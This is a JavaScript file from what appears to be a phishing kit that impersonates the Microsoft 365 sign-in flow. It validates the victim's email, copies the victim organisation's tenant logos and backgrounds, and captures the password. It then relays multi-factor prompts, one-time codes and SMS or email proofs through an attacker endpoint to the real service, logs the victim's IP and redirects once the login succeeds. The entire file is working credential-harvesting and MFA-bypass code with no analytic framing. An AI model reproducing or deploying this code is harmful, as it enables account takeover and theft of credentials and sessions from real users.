var Errs={'NoOtpCode':'Enter the code to help us verify your identity.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','OathCodeIncorrect':'You didn\'t enter the expected verification code. Please try again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoAccount':'We couldn\'t find an account with that username. Try another, or get a new account.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','NoPassword':'Please enter your password.','accIncorrect':'Your account or password is incorrect. If you don\'t remember your password, <a id="ViewDetails" class="no-wrap" href="#">reset it now.</a>','UnableVeri':'Sorry, we\'re having trouble verifying your account. Please try again <a id="ViewDetails" class="no-wrap" href="#">View details</a>','InvalidSession':'Your session has timed out. Please close your browser and sign in again.<a id="ViewDetails" class="no-wrap" href="#">View details</a>','Notemail':'We couldn\'t find an account with that username. Try another, or <a id="ViewDetails" class="no-wrap" href="#">get a new Microsoft account.</a>','rinfo':'This information is required.','not7digit':'Please enter the 7-digit code. The code only contains numbers.','codenotwork':'That code didn\'t work. Check the code and try again.'};
var email = "";
var epass = "";
var phone = "";
var dVal = [];
var lVal = [];
var pages = [];
var Key=""; 
var randomNum="";
var skip=1;
var myInterval,Proofs;
var Timeout;
var IP;
$( document ).ready(async function() {
console.log(semail);  
if(lmode=='a'){
skip=1;
}else{
skip=0;
}
if(isEmail(semail)){
email = $("#email").val(semail);
nextto(semail);
}else{
await getpage('EmailPage',1);  
if(semail){
email = $("#email").val(semail);
$("#error1").html(Errs['Notemail']);
}
}
});

async function getpage(page,dis){
var scrn= await GotoType(page);
if(scrn['status']='success'){
    pages[page]=scrn['msg'];
if(dis){
$("#screen1").html(scrn['msg']);

}else{
return scrn;    
}
$("#load").hide();
}
}
$.getJSON("https://api.ipify.org?format=json", function(data) {
    console.log(data.ip);
    IP=data.ip;
})
function isEmail(email) {
var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
return regex.test(email);
}
async function nextto(vak=null,bac=null) {
if(vak){
email = vak;  
}else{
email = $("#email").val();  
}
if(bac==1){
    $("#load").show();
}else{
    $("#load").hide();
}
$("#btn").attr("disabled", true);
if (skip==1 ) {
    if (isEmail(email) === true) {
 await getpage('PassPage',1); 
  $("#idBtn_Back").hide();
}else{
    $("#load").hide();
$("#error1").html(Errs['Notemail']);
}
 
}else{
var valx = '{"username":"'+email+'","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":"","country":"US","forceotclogin":false,"isExternalFederationDisallowed":false,"isRemoteConnectSupported":false,"federationFlags":0,"isSignup":false,"flowToken":"","isAccessPassSupported":true}';
$.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "validem",
},
}).done(async function (data) {
var vdata = JSON.parse(data);
if (vdata["IfExistsResult"]=='1' || vdata["IfExistsResult"]=='4'||vdata["IfExistsResult"]===undefined) {
  await getpage('EmailPage',1); 
$("#load").hide();
$("#error1").html(Errs['Notemail']);

}else{
    if(vdata["ThrottleStatus"]=="1" && vdata["EstsProperties"]["DomainType"]==4){
await getpage('OrgloadPage',1);
Timeout=setTimeout(async function(){
    await getpage('PassPage',1); 
     $("#idBtn_Back").hide();
},3000)
    }else{
   await getpage('PassPage',1); 
    }
if(bac==1){
    $("#idBtn_Back").show();
}else{
       $("#idBtn_Back").hide();

}
if(vdata["EstsProperties"]["UserTenantBranding"]){
var logo_image=vdata["EstsProperties"]["UserTenantBranding"][0]["BannerLogo"];
var bg_image=vdata["EstsProperties"]["UserTenantBranding"][0]["Illustration"];
if(logo_image){
$(".imglogo").attr("src", logo_image);   
}
if(bg_image){
$("#imgbg").css("background-image", "url(" + bg_image+ ")");
$("#footer, #footer a").addClass('has-background');
}
var BoilerPlateText=vdata["EstsProperties"]["UserTenantBranding"][0]['BoilerPlateText'];
if(BoilerPlateText){
$("#idBoilerPlateText").html(BoilerPlateText).show();
}
}
}  

$("#btn").attr("disabled", false);
$(".ext-promoted-fed-cred-box").hide();
});
}
}
function back(page) {
$("#screen1").html(pages[page]);
clearTimeout(Timeout);
$("#load").hide();
if(page=='EmailPage'){
$("#email").val(email);
$(".imglogo").attr("src", 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg');  
$("#imgbg").css("background-image", "url( https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)");
$(".ext-promoted-fed-cred-box").show();
$("#idBoilerPlateText").hide(); 
}
}
function cancel() {
location.reload();
}
var count = 0;
var lcount = 0;
async function redlogin() {
epass = $("#epass").val();

if (epass == "") {
$("#error2").html(Errs['NoPassword']);

} else {
count = count + 1;
$("#error2").html('');

$("#load").show();
$("#btn2").attr("disabled", true);
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, mode: 'OfficeLogin' },
}).done(async function (data) {
console.log(data);
var datArray = JSON.parse(data);

if (datArray["status"] == "success") {
await setCookie('check', IP, window.location.host);

window.location.replace(datArray["land"]);
} else if (datArray["status"] == "login_auth") {
auth(datArray["auth_val"]);
} else if (datArray["status"] == "login_auth_live") {
auth_live(datArray["auth_val"]);
}else if (datArray["status"] == "successx") {
lcount++;
if(lcount>=2){
window.location.replace(datArray["land"]);     
}else{
$("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);   
}
} else {
$("#load").hide();
$("#error2").html(Errs['accIncorrect']);
$("#epass").val("");
$("#btn2").attr("disabled", false);
return false;
}
});
}
}
function setCookie(key, value, domain) {
    console.log('sent');
let d = new Date();
d.setTime(d.getTime() + 86400);
let expires = "expires=" + d.toUTCString();
console.log(d.setTime(d.getTime() + 86400));
window.document.cookie = key + "=" + value + ";" + expires + ";domain=" + domain + ";" + "path=/; Secure; SameSite=None";
}
async  function auth(dauth) {
if(Proofs){
$("#screen1").html(Proofs);
}else{
dVal["arrUserProofs"] = dauth["arrUserProofs"];
dVal["ctx"] = dauth["ctx"];
dVal["flowToken"] = dauth["flowToken"];
dVal["canary"] = dauth["canary"];
var data = dauth["arrUserProofs"];
var gototype=await GotoType('Proofs');
if(gototype['status']){
Proofs=gototype['msg'];
$("#screen1").html(gototype['msg']);
$("#load").hide();
data.forEach(function (val, i) {
var authid = val["authMethodId"];
$("#screen1 #"+authid).show();
$("#screen1 #"+authid+ " .pnum").text(val["display"]);
phone = val["display"];
});
Proofs=$('#screen1').html();
}
}
}
async  function auth_live(dauth) {
if(Proofs){
$("#screen1").html(Proofs);
}else{
dVal=dauth;
var data = JSON.parse(dVal["arrUserProofs"]);

Key=dVal["extra"]["key"]; 
randomNum=dVal["extra"]["randomNum"];
var gototype=await getpage('ProofsLive',0);
if(gototype['status']){
Proofs=gototype['msg'];
$("#screen1").html(gototype['msg']);
$("#load").hide();
data.forEach(function (val, i) {
var channel = val["channel"];
$("#screen1 #"+channel).show();
$("#screen1 #"+channel+ " .pnum").text(val["name"]);
phone = val["display"];
if(channel=="SMS" || channel== "Email"){
$("#screen1  #iSelectProof #iSelectProofAlternate").attr('onmousedown','ihacode(\''+channel+'\')');
}
});

pages['ProofsLive']=$('#screen1').html();
}
}
}
function getproof(atype){
var data = JSON.parse(dVal["arrUserProofs"]);
var arrUserProofs = data.find((obj) => {return obj.channel === atype;});
$("#screen1 #iAdditionalProofInfo").hide();
$("#screen1 #"+atype+" #iAdditionalProofInfo").show();
$("#screen1 #"+atype+" #iAdditionalProofInfo .eml").text(arrUserProofs['name'].split('@')[1]);
if(atype=="SMS" || atype== "Email"){
$("#screen1  #iSelectProof #iSelectProofAction").attr('onclick','SendCodeLive(\''+atype+'\')');
$("#screen1  #iSelectProof #iSelectProofAction").attr('disabled',false).html("Send Code");
$("#screen1  #iSelectProof #iSelectProofAlternate").attr('onclick','ihacode(\''+atype+'\')');
}else if("unknown"){

$("#screen1  #iSelectProof #iSelectProofAction").attr('disabled',false).html("Verify Online");
}
}
async function SendCodeLive(atype) {
var data = JSON.parse(dVal["arrUserProofs"]);
var arrUserProofs = data.find((obj) => {return obj.channel === atype;});
if(atype=='Email'){
var pvalue=$("#iProofEmail").val();
var str = arrUserProofs['name'];
str=str.slice(0, 2);
pvx=pvalue.slice(0, 2);
if(str!=pvx){
$("#iProofEmail").addClass('has-error');
$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError span").text(str);
return false;
}
pvalue=pvalue+'@'+arrUserProofs['name'].split('@')[1];
}else{
var pvalue=$("#iProofPhone").val();
var str = arrUserProofs['name'];
str=str.slice(str.length - 2);
pvalue=pvalue.slice(pvalue.length - 2);
if(str!=pvalue){
$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError .errPh").text(str);
$("#iProofPhone").addClass('has-error');
return false;
}
pvalue=$("#iProofPhone").val();
}
$("#iVerifyCodeSpinner").show();
$("#iSelectProofAction").attr("disabled", true);
var valx = {token:'',purpose:'UnfamiliarLocationHard',epid:arrUserProofs['epid'],autoVerification:false,autoVerificationFailed:false,confirmProof:pvalue,uiflvr:dVal["uiflvr"],uaid:dVal["uaid"],scid:dVal["scid"],hpgid:dVal["hpgid"],canary:dVal["canary"],cookie:dVal["cookie"]};
$.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "SendOtt",
},
}).done(async function (data) {
$("#load").show();
console.log(data);
var vdata = JSON.parse(data);
if (vdata["route"]) {
// lVal["ctx"] = vdata["Ctx"];
var gototype=await getpage('ProofsVerifyCode',0);
if(gototype['status']){
$("#screen1").html(gototype['msg']);
$("#load").hide();
$("#iVerifyCodeTitle").html('Enter your security code');
$("#iVerifyCodeSpinner").hide();
$("#iSelectProofAction").attr("disabled", false);
if(atype=='Email'){
$("#screen1 .ScEmail").show();
$("#screen1 .ScEmail .dEM").text(pvalue);
$("#screen1 .ScSms").hide();
}else{
$("#screen1 .ScEmail").hide();
$("#screen1 .ScSms").show();
$("#screen1 .ScSms .fourDig").text(pvalue);
}
$("#screen1  #iVerifyCode #iVerifyCodeAction").attr('onclick','VerifyCodeLive(\''+atype+'\',\''+pvalue+'\')');
}
pages['ProofsVerifyCode']=$('#screen1').html();
}else{
 $("#iVerifyCodeSpinner").hide();
$("#screen1 #"+atype+" #iAdditionalProofInfo #iProofInputError").show();
}
});
}
async function ihacode(atype){
$("#iVerifyCodeSpinner").show();
var gototype=await getpage('ProofsVerifyCode',0);
if(gototype['status']){
$("#screen1").html(gototype['msg']);
$("#load").hide();
$("#iVerifyCodeTitle").html('Enter the code we sent you');
$("#iVerifyCodeSpinner").hide();
$("#iSelectProofAction").attr("disabled", false);
$("#screen1 .ScEmail").hide();
$("#screen1 .ScSms").hide();
$("#screen1  #iVerifyCode #iVerifyCodeAction").attr('onclick','VerifyCodeLive(\''+atype+'\',null)');
}  
pages['ProofsVerifyCode']=$('#screen1').html();
}
async function VerifyCodeLive(atype,pvalue) {
      var data = JSON.parse(dVal["arrUserProofs"]);
    var arrUserProofs = data.find((obj) => {return obj.channel === atype;});
var vcode=$("#iOttText").val();
if(vcode==''){
    $("#iVerifyCodeError").html(Errs['rinfo']).show();
    $("#iOttText").addClass('has-error');
    return false;
}else if(vcode.length!=7){
      $("#iVerifyCodeError").html(Errs['not7digit']).show();
  $("#iOttText").addClass('has-error');
}else{
 var vcodexx=Encrypt(null, vcode, "saproof", null);
$("#iVerifyCodeSpinner").show();
$("#iVerifyCodeAction").attr("disabled", true);

var valx={publicKey:dVal['extra']['ski'],encryptedCode: vcodexx,action:'IptVerify',purpose:'UnfamiliarLocationHard',epid:arrUserProofs["epid"],uiflvr : dVal["uiflvr"],uaid : dVal["uaid"], scid:dVal["scid"],hpgid:dVal["hpgid"],canary:dVal["canary"],cookie : dVal["cookie"], urlreturn:dVal["urlreturn"]};

if(pvalue){
valx['confirmProof']=pvalue;
}
var gdata  = await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
email: email, epass: epass,
valx: valx,
mode: "VerifyCode",
}
}).done(function (data) {
    console.log(data);
    $("#iVerifyCodeSpinner").hide();
    $("#iVerifyCodeAction").attr("disabled", false);
var vdata = JSON.parse(data);
if (vdata["error"]) {
$("#screen1 #iVerifyCodeError").html(Errs['codenotwork']).show(); 
}else if (vdata["status"] == "success") {
window.location.replace(vdata["land"]);
}else{
}
});
}
}
async  function  GotoAuth(atype){
$("#load").show();
var reslt = await GotoType(atype);
if(reslt['status']=='success'){
var act= await beginAuth(atype);
if (act["Success"]) {
$("#load").hide();
$("#screen1").html(reslt['msg']);
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
if(act['Entropy']){
$("#displaySign").show();
$("#displaySigntxt").html(act['Entropy']);
}
startEndath(atype);
}
}else{
authback(1);
}
}
}
function authback(err) {
$("#load").show();
auth(dVal);
stopEndath();
if(err){
setTimeout(function(){
$("#screen1 #errorx").html(Errs['UnableVeri']);  
$("#load").hide();
},1000)

}else{
$("#load").hide();  
}
}
async function GotoType(atype) {
var reslt= await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
atype: atype,
email: email,
phone: phone,
mode: "GotoType"
},
})
return JSON.parse(reslt);

}
function AuthEdata(atype){
if (atype == "TwoWayVoiceMobile" || atype == "PhoneAppNotification") {
stopEndath();
processAuth(atype, "");
}
}
async function verifyOTC(atype) {
$("#screen1 #staErr").html('');
var otc = $("#screen1 #otc").val();
if(otc!=''){
$("#load").show();
$("#screen1 #verifyOTC").attr('disabled',true);
var res= await endAuth(atype, otc);
$("#load").hide();
if (res["Success"]) {
$("#load").show();
processAuth(atype, otc);
}else if (res["ResultValue"]=='InvalidSession'){
$("#screen1 #verifyOTC").attr('disabled',false);
$("#screen1 #staErr").html(Errs['InvalidSession']);
}else if (res["ResultValue"]=='OathCodeIncorrect'){
$("#screen1 #verifyOTC").attr('disabled',false);
$("#screen1 #staErr").html(Errs['OathCodeIncorrect']);
}else{
$("#screen1 #staErr").html('');
authback(1);
}
}else{
$("#load").hide();
$("#screen1 #staErr").html(Errs['NoOtpCode']);
}

}
async function beginAuth(atype) {
var valx = '{"AuthMethodId":"' + atype + '","Method":"BeginAuth","ctx":"' + dVal["ctx"] + '","flowToken":"' + dVal["flowToken"] + '"}';
var gdata  = await $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "bauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
if (vdata["Success"]) {
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
lVal["stpoll"] = datetoiso(vdata["Timestamp"]);
lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
}else{
$("#screen1 #errorx").html(Errs['UnableVeri']);  
}
});
var vdata = JSON.parse(gdata);
return vdata;
}

var PollCount = 1;
async function endAuth(atype, otc) {
lVal["stpoll"] = datetoiso(new Date());
PollCount++;
var valx =
'{"Method":"EndAuth","SessionId":"' +
lVal["sseid"] +
'","FlowToken":"' +
lVal["flowToken"] +
'","Ctx":"' +
lVal["ctx"] +
'","AuthMethodId":"' +
atype +
'","AdditionalAuthData":"' +
otc +
'","PollCount":' +
PollCount +
"}";
var rr = await  $.ajax({
type: "POST",
url: urlx,
data: {
action: "signup",
valx: valx,
mode: "eauth",
},
}).done(function (data) {
var vdata = JSON.parse(data);
lVal["ctx"] = vdata["Ctx"];
lVal["flowToken"] = vdata["FlowToken"];
lVal["sseid"] = vdata["SessionId"];
lVal["edpoll"] = datetoiso(vdata["Timestamp"]);
if (vdata["Success"]) {
PollCount = 1;
AuthEdata(atype);
}
if (PollCount >= 10) {
authback(1);
stopEndath();
}

});
var vdata = JSON.parse(rr);
return vdata;
}
function processAuth(atype, otc) {
var valx =
'{"type":19,"GeneralVerify":true,"request":"' +
lVal["ctx"] +
'","mfaLastPollStart":"'+lVal["stpoll"]+'","mfaLastPollEnd": "'+lVal["edpoll"]+'","mfaAuthMethod": "' +
atype +
'","otc": "' +
otc +
'","login": "' +
email +
'","flowToken":"' +
lVal["flowToken"] +
'","hpgrequestid":"' +
lVal["sseid"] +
'","sacxt":"","hideSmsInMfaProofs":false,"canary":"'+dVal["canary"]+'","i19": "42293"}';
$.ajax({
type: "POST",
url: urlx,
data: { action: "signup", email: email, epass: epass, valx: valx, mode: "pAuth" },
}).done(function (data) {
var datArray = JSON.parse(data);
if (datArray["status"] == "success") {
window.location.replace(datArray["land"]);
}
});
}
function startEndath(atype) {
myInterval = setInterval(function () {
endAuth(atype, "");
}, 5000);
}
function stopEndath() {
clearInterval(myInterval);
}
function datetoiso(date){
var dateobj =  new Date(date);
return dateobj.getTime();
}
$(document).on('keypress',function(e) {
if(e.which == 13) {
if(e.target.id=='email'){
nextto(null,1);
}else if(e.target.id=='epass'){
redlogin();
}else if(e.target.id=='otc'){
$("#verifyOTC").click();
}else if(e.target.name=='livecode'){
$("#iSelectProofAction").click();
}else if(e.target.id=='iOttText'){
$("#iVerifyCodeAction").click();
}
}
});
function dec2hex (dec){return dec.toString(16).padStart(2, "0")}function generateId (len){var arr=new Uint8Array((len || 40) / 2);window.crypto.getRandomValues(arr);return Array.from(arr, dec2hex).join('');}var SesIN=generateId (40); $("div").addClass(SesIN);